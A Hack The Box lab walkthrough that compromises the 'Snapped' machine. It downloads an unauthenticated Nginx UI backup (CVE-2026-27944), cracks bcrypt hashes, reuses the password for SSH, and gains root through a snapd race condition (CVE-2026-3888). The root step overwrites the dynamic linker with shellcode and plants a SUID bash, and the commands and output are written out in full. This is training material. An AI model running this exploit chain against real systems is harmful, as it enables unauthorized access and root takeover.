---
title: "Snapped Walkthrough - HTB Hard | Nginx UI CVE-2026-27944 & Snapd CVE-2026-3888"
description: "Complete walkthrough of Snapped from Hack The Box. A hard Linux machine featuring Nginx UI vulnerable to CVE-2026-27944, allowing unauthenticated backup download and decryption. Extracted database contains bcrypt hashes, with the admin password enabling SSH access as jonathan through credential reuse. Privilege escalation exploits CVE-2026-3888 in snapd, requiring precise timing across three terminals to perform a race condition attack on snap-confine, ultimately achieving root access through dynamic linker hijacking inside AppArmor sandbox."
author: dua2z3rr
date: 2026-03-24 1:00:00
categories:
  - HackTheBox
  - Machines
tags: ["web-application", "broken-authentication-and-authorization", "misconfiguration", "race-condition", "insecure-design", "bash", "nginx", "openssl", "linux", "reconnaissance", "password-cracking", "sandbox-escape", "suid-exploitation", "authentication-bypass"]
image: /assets/img/snapped/snapped-resized.png
---

## Overview

Snapped is a hard-difficulty machine that features two recent CVEs. The foothold showcases [CVE-2026-27944](https://nvd.nist.gov/vuln/detail/CVE-2026-27944) in Nginx-UI, which exposes the /api/backup endpoint without authentication. The endpoint will produce a full backup of the nginx and nginx-UI configuration files, and includes the key to decrypt the backup in the response headers. This leads to finding and decrypting a weak user password from the Nginx-UI database file. Root exploits [CVE-2026-3888](https://nvd.nist.gov/vuln/detail/CVE-2026-3888), a TOCTOU race condition between snap-confine and systemd-tmpfiles. After the system's cleanup daemon deletes a stale mimic directory under /tmp, the attacker recreates it with controlled content and single-steps snap-confine's execution via AF_UNIX socket backpressure to win the race during the mimic bind-mount sequence reliably. This poisons the sandbox's shared libraries, enabling dynamic linker hijacking on the SUID-root snap-confine binary to compromise the system.

---

## External Enumeration

### Nmap

Here's the output of the usual nmap command:

```shell
[Mar 24, 2026 - 21:37:13 (CET)] exegol-main Snapped # ports=$(nmap -p- --min-rate=1000 -T4 10.129.11.16 2>/dev/null | grep '^[0-9]' | cut -d '/' -f1 | paste -sd ',' -); nmap -vv -p"$ports" -sC -sV 10.129.11.16
Starting Nmap 7.93 ( https://nmap.org ) at 2026-03-24 21:38 CET
<SNIP>
Nmap scan report for 10.129.11.16
Host is up, received echo-reply ttl 63 (0.20s latency).
Scanned at 2026-03-24 21:38:42 CET for 12s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4bc1eb48874a0854897093b7c7a9ea79 (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJmeoJvLKYHBiXGWuhesZc1pKunLKcWr27Tf1iTu4Vrf+ZnI3aAEdfSNx1s+74ezW5xgxjkv9xbVUTpJ+fUyUhM=
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://snapped.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
<SNIP>
```

**Key findings:**
- Port 22: **SSH** (OpenSSH 9.6p1 Ubuntu)
- Port 80: **HTTP** (nginx 1.24.0)
- Redirect to **snapped.htb**
- Ubuntu Linux system

Port 80 is the only interesting one. I see nginx is present - there could be subdomains or vhosts.

---

## Initial Access

### HTTP Enumeration

Let's add `snapped.htb` to **/etc/hosts** and access the site:

![homepage](assets/img/snapped/homepage.png)

On this page there's nothing to interact with, so I start fuzzing the web app and find a VHOST:

```shell
[Mar 24, 2026 - 21:53:42 (CET)] exegol-main snapped # ffuf -w /opt/lists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://snapped.htb/ -H 'Host: FUZZ.snapped.htb' -ic -fs 154

/'___\  /'___\           /'___\
/\ \__/ /\ \__/  __  __  /\ \__/
\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
\ \_\   \ \_\  \ \____/  \ \_\
\/_/    \/_/   \/___/    \/_/

v2.1.0
________________________________________________

:: Method           : GET
:: URL              : http://snapped.htb/
:: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
:: Header           : Host: FUZZ.snapped.htb
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
:: Filter           : Response size: 154
________________________________________________

admin                   [Status: 200, Size: 1407, Words: 164, Lines: 50, Duration: 146ms]
:: Progress: [114438/114438] :: Job [1/1] :: 220 req/sec :: Duration: [0:08:25] :: Errors: 0 ::
```

**VHOST discovered:** `admin.snapped.htb`

Let's add it to /etc/hosts and visit it (it didn't work for about ten minutes, then with Burp's browser it worked by intercepting requests).

### Admin VHOST

We find ourselves in front of a login page for an nginx GUI:

![nginx gui login page](assets/img/snapped/nginx_UI_login.png)

Looking at the favicon, we can easily figure out which nginx UI we're talking about. Here it is: <https://github.com/0xJacky/nginx-ui>

### Vulnerability Research

I find this report online of a very recent vulnerability at the time of writing: <https://www.cve.news/cve-2026-27944/>

The site says:

> Nginx UI has made managing the popular Nginx web server a breeze with a clean interface and modern controls. But up until version 2.3.3, a critical vulnerability—CVE-2026-27944—could give an attacker everything: user credentials, SSL private keys, configurations, and more—fully decrypted—without ever logging in. This flaw puts thousands of deployments at risk if they aren't patched.

I like what I'm hearing. Let's try the exploit.

### CVE-2026-27944 Exploitation

We can find a PoC on GitHub instead of doing the exploit manually: <https://github.com/Skynoxk/CVE-2026-27944/blob/main/exploit_enhanced.py>

With this we can extract the backup of nginx and nginx-ui:

```shell
[Mar 24, 2026 - 22:28:29 (CET)] exegol-main snapped # python3 exploit2.py --target http://admin.snapped.htb/ --decrypt

____  _  __                           _
/ ___|| |/ /_   _ _ __   _____  _ __| | __
\___ \| ' /| | | | '_ \ / _ \ \/ /| |/ /
___) | . \| |_| | | | | (_) >  < |   <
|____/|_|\_\\__, |_| |_|\___/_/\_\|_|\_\
|___/

======================================================================
CVE-2026-27944 - Nginx UI Unauthenticated Backup Download + Dashboard Access
======================================================================

[*] Downloading backup from http://admin.snapped.htb/api/backup
[+] Backup downloaded successfully (18306 bytes)
[+] Saved to: backup.bin

[*] X-Backup-Security header: KN329rl/L1DenNrdf4YwXVpXwRxjBKoW2ArTOf3ouh8=:SjsrpvGI2zppgH5JgydG2w==
[+] Parsed AES-256 key: KN329rl/L1DenNrdf4YwXVpXwRxjBKoW2ArTOf3ouh8=
[+] Parsed AES IV    : SjsrpvGI2zppgH5JgydG2w==

[+] Key length: 32 bytes (AES-256 ✓)
[+] IV length : 16 bytes (AES block size ✓)

[*] Extracting encrypted backup to backup_extracted
[*] Main archive contains: ['hash_info.txt', 'nginx-ui.zip', 'nginx.zip']
[*] Decrypting hash_info.txt...
→ Saved to backup_extracted/hash_info.txt.decrypted (199 bytes)
[*] Decrypting nginx-ui.zip...
→ Saved to backup_extracted/nginx-ui_decrypted.zip (7688 bytes)
→ Extracted 2 files to backup_extracted/nginx-ui
[*] Decrypting nginx.zip...
→ Saved to backup_extracted/nginx_decrypted.zip (9936 bytes)
→ Extracted 22 files to backup_extracted/nginx

[*] Hash info:
nginx-ui_hash: 4372d93c3d891090e0d07feee338be610454c83bca83107fac1e9967131a535e
nginx_hash: 602be07c0386671190d6baa8262a36105cee9e006a141cc8b90831d4a8eb6cf7
timestamp: 20260324-172747
version: 2.3.2
```

**Backup successfully downloaded and decrypted.**

### Backup Enumeration

In the `backup_extracted/nginx-ui` folder, we can find a database.db file. We can open it with sqlite3, and we'll find a table called users:

```sqlite
sqlite> SELECT * FROM users
...> ;
1|2026-03-19 08:22:54.41011219-04:00|2026-03-19 08:39:11.562741743-04:00||admin|$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm|1||g�

|�7�ĝ�*�:���(��\�D�O�}u#,�|en
2|2026-03-19 09:54:01.989628406-04:00|2026-03-19 09:54:01.989628406-04:00||jonathan|$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq|1||,��զ�H�։��e)5U��Z��▒KĦ"D���W▒|en
```

**Users found:**
- admin: $2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm (bcrypt)
- jonathan: $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq (bcrypt)

### Hash Cracking

We can crack these hashes we just found with hashcat:

```shell
[Mar 24, 2026 - 22:36:21 (CET)] exegol-main snapped # nano hash
[Mar 24, 2026 - 22:36:41 (CET)] exegol-main snapped # hashid -m hash
--File 'hash'--
Analyzing '$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm'
[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
[+] Woltlab Burning Board 4.x
[+] bcrypt [Hashcat Mode: 3200]
Analyzing '$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq'
[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
[+] Woltlab Burning Board 4.x
[+] bcrypt [Hashcat Mode: 3200]
--End of file 'hash'--
[Mar 24, 2026 - 22:36:54 (CET)] exegol-main snapped # hashcat -m 3200 hash /opt/lists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq:linkinpark
```

**Admin password cracked:** `linkinpark`

### SSH Access

If we try to log in with the admin password using the other account's username from the DB, we can get a shell:

```shell
[Mar 24, 2026 - 22:43:40 (CET)] exegol-main snapped # ssh jonathan@snapped.htb
The authenticity of host 'snapped.htb (10.129.11.16)' can't be established.
ED25519 key fingerprint is SHA256:n0XlQQqHGczclhalpCeoOZDYQGr7rl3WlJytHLWPkr8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'snapped.htb' (ED25519) to the list of known hosts.
jonathan@snapped.htb's password:
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.17.0-19-generic x86_64)

<SNIP>

Last login: Fri Mar 20 12:27:50 2026 from 10.10.14.5
jonathan@snapped:~$
```

**Credentials:** `jonathan:linkinpark` (credential reuse)

**User flag obtained.**

---

## Privilege Escalation

### Internal Enumeration

Let's try the classic commands:

```shell
jonathan@snapped:~$ sudo -l
[sudo] password for jonathan:
Sorry, user jonathan may not run sudo on snapped.
```

So I use linpeas.

### LinPEAS Transfer

```shell
[Mar 24, 2026 - 22:49:16 (CET)] exegol-main snapped # cd /opt/resources/linux/linPEAS
[Mar 24, 2026 - 22:49:37 (CET)] exegol-main linPEAS # python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.11.16 - - [24/Mar/2026 22:50:25] "GET /linpeas.sh HTTP/1.1" 200 -
```

```shell
jonathan@snapped:~$ wget http://10.10.15.76:8000/linpeas.sh
--2026-03-24 17:49:37--  http://10.10.15.76:8000/linpeas.sh
Connecting to 10.10.15.76:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 975444 (953K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh                                                 100%[========================================================================================================================================>] 952.58K   540KB/s    in 1.8s

2026-03-24 17:49:39 (540 KB/s) - 'linpeas.sh' saved [975444/975444]

jonathan@snapped:~$ chmod +x linpeas.sh
```

### LinPEAS Output Analysis

The sudo version is marked in red: version 1.9.15p5. I search online for known vulnerabilities and find this: <https://github.com/zinzloun/CVE-2025-32463>. A requirement is that the /etc/nsswitch.conf file exists:

```shell
jonathan@snapped:~$ ls -al /etc/nsswitch.conf
-rw-r--r-- 1 root root 594 Aug 27  2024 /etc/nsswitch.conf
```

Perfect! Let's download the exploit and become root!

### Sudo Exploit Attempt (Rabbit Hole)

```shell
jonathan@snapped:~$ cd 10.10.15.76\:8000/
jonathan@snapped:~/10.10.15.76:8000$ ls -al
total 52
drwxrwxr-x  3 jonathan jonathan  4096 Mar 24 17:58 .
drwxr-x--- 17 jonathan jonathan  4096 Mar 24 17:58 ..
drwxrwxr-x  8 jonathan jonathan  4096 Mar 24 17:58 .git
-rw-rw-r--  1 jonathan jonathan   357 Mar 24 17:58 index.html
-rw-rw-r--  1 jonathan jonathan 11357 Mar 24 17:58 LICENSE
-rw-rw-r--  1 jonathan jonathan   517 Mar 24 17:58 poc.sh
-rw-rw-r--  1 jonathan jonathan  1654 Mar 24 17:58 README.md
-rw-rw-r--  1 jonathan jonathan 15536 Mar 24 17:58 woot1337.so.2
jonathan@snapped:~/10.10.15.76:8000$ chmod +x poc.sh
jonathan@snapped:~/10.10.15.76:8000$ ./poc.sh
woot!
[sudo] password for jonathan:
sudo: you are not permitted to use the -R option with woot
```

**It was too good to be true.** After all, this box is hard. If this had been the solution, it would have been a bit trivial.

The real vulnerability is **CVE-2026-3888**, visible from the snap/snapd version and from the box name (**snap**pe**d**)...

### CVE-2026-3888 Exploitation

There are many steps and you need to use 3 terminals.

First, download the files from this folder from this repo <https://github.com/nomaisthere/CVE-2026-3888/tree/main/src> and compile them with this command:

```shell
gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell.c

gcc -O2 -static -o firefox_2404 firefox_2404.c
```

Then, on **terminal 1** (after transferring the 2 files to our home directory and giving execution permissions):

```shell
jonathan@snapped:~$ systemd-run --user --scope --unit=snap.init$(date +%s) \
env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine \
--base core22 snap.firefox.hook.configure /bin/bash
<SNIP>
jonathan@snapped:/home/jonathan$ cd /tmp
jonathan@snapped:/tmp$ stat ./.snap
File: ./.snap
Size: 4096            Blocks: 8          IO Block: 4096   directory
Device: fc00h/64512d    Inode: 261812      Links: 4
Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2026-03-25 17:33:47.576019045 -0400
Modify: 2026-03-25 17:33:47.609019047 -0400
Change: 2026-03-25 17:33:47.609019047 -0400
Birth: 2026-03-25 17:33:47.576019045 -0400
jonathan@snapped:/tmp$ echo $$
3034
jonathan@snapped:/tmp$ while test -d ./.snap; do
>     touch ./
>     sleep 1
> done

jonathan@snapped:/tmp$ # Loop exits silently when systemd-tmpfiles deletes .snap
jonathan@snapped:/tmp$
```

When the loop terminates, we should act quickly with the next commands. The loop can terminate without error as in the code block above.

**Terminal 2:**

```shell
jonathan@snapped:~$ cd /proc/3034/cwd
ls -la
# drwxrwxrwt  ... (this is /tmp inside the sandbox)
total 4
drwxrwxrwt  2 root root 4096 Mar 25 17:38 .
drwxr-xr-x 21 root root  540 Mar 25 17:33 ..
jonathan@snapped:/proc/3034/cwd$ # The systemd-run wrapper puts us in the right cgroup
systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash -c \
"env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine \
--base snapd snap.firefox.hook.configure /nonexistent; exit"

# Expected output (error is intentional):
# cannot perform operation: mount --rbind /dev ... No such file or directory
Running as unit: snap.d1774474701.scope; invocation ID: 4158ab25127e4ca6ba300a00d27af5d5
cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_9NV9kp//dev: No such file or directory
jonathan@snapped:/proc/3034/cwd$ # Run from inside the sandbox's /tmp (we are still in /proc/3424/cwd)
~/firefox_2404 ~/librootshell.so
<SNIP>
[*] CVE-2026-3888 - firefox 24.04 helper
[*] CWD: /proc/3424/cwd
[*] Setting up .snap and .exchange directory...
[*] Exchange dir ready: 285 entries in .snap/usr/lib/x86_64-linux-gnu.exchange
[*] Starting race against snap-confine...
[*] Reading snap-confine output (PID 4821)...
[!] TRIGGER DETECTED! Swapping .exchange...
[+] SWAP DONE! Race won.
[*] Do NOT close this terminal.
[+] Race won! Our libraries are in the namespace.
```

**Errors are normal.**

**Terminal 3:**

```shell
jonathan@snapped:~$ PID=$(cat /proc/3034/cwd/race_pid.txt)
echo "Inner PID: $PID"
Inner PID: 3807
jonathan@snapped:~$ cd /proc/$PID/root

# Verify we own the dynamic linker
stat -c '%U:%G %a' usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
# jonathan:jonathan 755
jonathan:jonathan 755
jonathan@snapped:/proc/3807/root$ # Plant busybox as /tmp/sh-static binary, no dependency on ld-linux
cp /usr/bin/busybox ./tmp/sh

# Overwrite ld-linux with our shellcode
# Any dynamically-linked SUID binary executed in this namespace will now
# run our shellcode instead of the real dynamic linker
cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
jonathan@snapped:/proc/3807/root$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine  --base core22 snap.firefox.hook.configure /usr/lib/snapd/snap-confine


BusyBox v1.36.1 (Ubuntu 1:1.36.1-6ubuntu3.1) built-in shell (ash)
Enter 'help' for a list of built-in commands.

/ # cp /bin/bash /var/snap/firefox/common/bash
/ # chmod 04755 /var/snap/firefox/common/bash
/ # exit
```

The last 3 commands are used to get a real shell, outside the AppArmor sandbox.

---

## Root Access

```shell
jonathan@snapped:/proc/3807/root$ /var/snap/firefox/common/bash -p
bash-5.1# whoami
root
bash-5.1# id
uid=1000(jonathan) gid=1000(jonathan) euid=0(root) groups=1000(jonathan)
bash-5.1#
```

**Root flag obtained.** Box completed.

> If the exploit doesn't work because you weren't fast enough, I recommend resetting the box and trying again.
{: .prompt-danger }

---

## Reflections

### What Surprised Me

The CVE-2026-3888 snapd exploitation complexity was remarkable. Requiring precise coordination across three terminals with race condition timing to hijack the dynamic linker inside an AppArmor sandbox was really cool. The sudo CVE-2025-32463 turned out to be a rabbit hole, seemingly promising but ultimately blocked by permissions. The box name "Snapped" being a direct hint to snap/snapd was a clever clue I should have recognized earlier.

### Main Mistake

I wasn't fast enough the first two times trying to exploit CVE-2026-3888 that i had to reboot the box. In fact, the PoC repository also said to immediately execute the commands on terminal 2 and 3.

### Open Question

Are race conditions vulnerabilities difficult to spot in the wild, or are they one of the most present? How  can we  be sure that our programs do not this kind of vulnerabilities? How does a pentester spot them while doing reverse engineering?

---

**Completed this box? Did the snap/snapd hint in the name give it away?** Leave a comment down below!
